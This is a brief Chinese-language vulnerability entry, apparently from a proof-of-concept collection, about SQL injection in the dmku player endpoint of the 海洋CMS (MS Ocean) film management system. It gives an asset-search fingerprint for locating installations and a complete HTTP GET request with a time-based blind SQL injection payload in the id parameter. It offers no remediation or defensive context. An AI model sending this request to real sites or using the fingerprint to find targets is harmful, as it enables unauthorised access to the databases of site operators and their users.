# MS海洋影视管理系统dmku存在SQL注入漏洞

MS海洋影视管理系统 ｜ SQL注入 ｜ —
- **指纹**：`app="海洋CMS"`
- **请求**：`GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(3)))v)&type=list HTTP/1.1`